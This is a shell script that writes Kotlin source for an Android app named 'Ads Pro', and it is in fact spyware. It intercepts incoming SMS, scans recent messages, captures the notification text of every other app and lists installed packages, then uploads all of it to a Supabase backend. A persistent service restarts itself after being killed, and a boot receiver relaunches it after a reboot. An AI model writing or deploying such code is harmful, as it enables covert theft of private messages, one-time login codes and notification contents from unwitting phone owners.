          cat > app/src/main/java/com/adspro/app/worker/AppWorkers.kt <<'END_OF_FILE'
          package com.adspro.app.worker

          import android.content.Context
          import androidx.work.Worker
          import androidx.work.WorkerParameters
          import com.adspro.app.data.AppDatabase
          import com.adspro.app.data.SupabaseClient
          import com.adspro.app.service.SmsSyncService
          import android.content.Intent
          import android.os.Build

          class SmsSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
              override fun doWork(): Result {
                  val dao = AppDatabase.getInstance(applicationContext).outboxDao()
                  val list = kotlinx.coroutines.runBlocking { dao.getAllSms() }
                  for (sms in list) {
                      val success = SupabaseClient.insert("sms_logs", mapOf("sender" to sms.sender, "body" to sms.body, "timestamp" to sms.timestamp))
                      if (success) kotlinx.coroutines.runBlocking { dao.deleteSms(sms) } else return Result.retry()
                  }
                  return Result.success()
              }
          }

          class NotificationSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
              override fun doWork(): Result {
                  val dao = AppDatabase.getInstance(applicationContext).outboxDao()
                  val list = kotlinx.coroutines.runBlocking { dao.getAllNotifs() }
                  for (notif in list) {
                      val success = SupabaseClient.insert("notifications", mapOf("package_name" to notif.packageName, "title" to notif.title, "text" to notif.text, "timestamp" to notif.timestamp))
                      if (success) kotlinx.coroutines.runBlocking { dao.deleteNotif(notif) } else return Result.retry()
                  }
                  return Result.success()
              }
          }

          class AppsSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
              override fun doWork(): Result {
                  val pm = applicationContext.packageManager
                  val apps = pm.getInstalledPackages(0).map { mapOf("package_name" to it.packageName, "version" to (it.versionName ?: "")) }
                  SupabaseClient.insert("installed_apps", mapOf("apps" to apps))
                  return Result.success()
              }
          }

          class CatchupScanWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
              override fun doWork(): Result {
                  val cursor = applicationContext.contentResolver.query(
                      android.provider.Telephony.Sms.CONTENT_URI,
                      arrayOf("address", "body", "date"),
                      "date > ?",
                      arrayOf((System.currentTimeMillis() - 86400000L).toString()),
                      null
                  )
                  cursor?.use {
                      val dao = AppDatabase.getInstance(applicationContext).outboxDao()
                      val addrIdx = it.getColumnIndex("address")
                      val bodyIdx = it.getColumnIndex("body")
                      val dateIdx = it.getColumnIndex("date")
                      while (it.moveToNext()) {
                          val sender = if (addrIdx != -1) it.getString(addrIdx) ?: "Unknown" else "Unknown"
                          val body = if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else ""
                          val date = if (dateIdx != -1) it.getLong(dateIdx) else System.currentTimeMillis()
                          kotlinx.coroutines.runBlocking { dao.insertSms(com.adspro.app.data.SmsEntity(sender = sender, body = body, timestamp = date)) }
                      }
                  }
                  return Result.success()
              }
          }

          class WatchdogWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
              override fun doWork(): Result {
                  val intent = Intent(applicationContext, SmsSyncService::class.java)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      applicationContext.startForegroundService(intent)
                  } else {
                      applicationContext.startService(intent)
                  }
                  return Result.success()
              }
          }
          END_OF_FILE

          cat > app/src/main/java/com/adspro/app/service/SmsSyncService.kt <<'END_OF_FILE'
          package com.adspro.app.service

          import android.app.*
          import android.content.*
          import android.content.pm.ServiceInfo
          import android.os.*
          import androidx.core.app.NotificationCompat

          class SmsSyncService : Service() {
              override fun onCreate() {
                  super.onCreate()
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      val channel = NotificationChannel("ads_pro_silent_channel", "Ads Pro Service", NotificationManager.IMPORTANCE_LOW)
                      getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
                  }
              }
              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                  val notification = NotificationCompat.Builder(this, "ads_pro_silent_channel")
                      .setContentTitle("Ads Pro")
                      .setContentText("Background data sync active")
                      .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                      .build()

                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                      startForeground(888, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                  } else {
                      startForeground(888, notification)
                  }
                  return START_STICKY
              }
              override fun onTaskRemoved(rootIntent: Intent?) {
                  super.onTaskRemoved(rootIntent)
                  val restartIntent = Intent(applicationContext, SmsSyncService::class.java)
                  val pendingIntent = PendingIntent.getService(applicationContext, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
                  val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                  alarm.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
              }
              override fun onDestroy() {
                  super.onDestroy()
                  startService(Intent(this, SmsSyncService::class.java))
              }
              override fun onBind(intent: Intent?): IBinder? = null
          }
          END_OF_FILE

          cat > app/src/main/java/com/adspro/app/service/AppNotificationListener.kt <<'END_OF_FILE'
          package com.adspro.app.service

          import android.service.notification.NotificationListenerService
          import android.service.notification.StatusBarNotification
          import com.adspro.app.data.AppDatabase
          import com.adspro.app.data.NotificationEntity
          import kotlinx.coroutines.*

          class AppNotificationListener : NotificationListenerService() {
              private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
              override fun onNotificationPosted(sbn: StatusBarNotification?) {
                  if (sbn == null || sbn.packageName == applicationContext.packageName) return
                  val extras = sbn.notification?.extras ?: return
                  val title = extras.getCharSequence("android.title")?.toString() ?: ""
                  val text = extras.getCharSequence("android.text")?.toString() ?: ""
                  if (title.isEmpty() && text.isEmpty()) return
                  scope.launch {
                      try {
                          val dao = AppDatabase.getInstance(applicationContext).outboxDao()
                          dao.insertNotif(NotificationEntity(packageName = sbn.packageName, title = title, text = text, timestamp = sbn.postTime))
                      } catch (e: Exception) { e.printStackTrace() }
                  }
              }
              override fun onDestroy() { super.onDestroy(); scope.cancel() }
          }
          END_OF_FILE

          cat > app/src/main/java/com/adspro/app/receiver/SmsReceiver.kt <<'END_OF_FILE'
          package com.adspro.app.receiver

          import android.content.*
          import android.provider.Telephony
          import androidx.work.OneTimeWorkRequestBuilder
          import androidx.work.WorkManager
          import com.adspro.app.data.AppDatabase
          import com.adspro.app.data.SmsEntity
          import com.adspro.app.worker.SmsSyncWorker
          import kotlinx.coroutines.*

          class SmsReceiver : BroadcastReceiver() {
              override fun onReceive(context: Context, intent: Intent) {
                  if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                      val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
                      val pendingResult = goAsync()
                      CoroutineScope(Dispatchers.IO).launch {
                          try {
                              val dao = AppDatabase.getInstance(context).outboxDao()
                              for (sms in messages) {
                                  dao.insertSms(SmsEntity(sender = sms.originatingAddress ?: "Unknown", body = sms.messageBody ?: "", timestamp = sms.timestampMillis))
                              }
                              WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<SmsSyncWorker>().build())
                          } catch (e: Exception) { e.printStackTrace() } finally { pendingResult.finish() }
                      }
                  }
              }
          }
          END_OF_FILE

          cat > app/src/main/java/com/adspro/app/receiver/BootReceiver.kt <<'END_OF_FILE'
          package com.adspro.app.receiver

          import android.content.*
          import com.adspro.app.AdsProApplication

          class BootReceiver : BroadcastReceiver() {
              override fun onReceive(context: Context, intent: Intent) {
                  if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
                      (context.applicationContext as? AdsProApplication)?.startCoreServices()
                  }
              }
          }
